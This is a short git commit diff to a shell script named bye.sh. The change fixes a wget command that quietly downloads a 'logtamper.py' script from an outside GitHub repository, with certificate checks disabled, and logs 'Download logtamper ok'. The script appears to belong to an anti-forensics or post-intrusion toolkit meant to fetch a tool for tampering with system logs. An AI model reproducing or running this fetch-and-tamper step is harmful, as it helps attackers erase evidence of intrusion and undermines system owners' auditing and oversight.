72f7c5ae9b2247e8e52eeb2baeaf7345085e112f
root <root@localhost.localdomain>
2019-03-28 02:08:48 -0400

    ok

--- bye.sh
+++ bye.sh
@@ -37,7 +37,7 @@ fi
 
 
 if [ !  -f $clear_shell ];then
-    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O- $clear_shell;
+    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;
     gglog "Download logtamper ok"
 fi
 
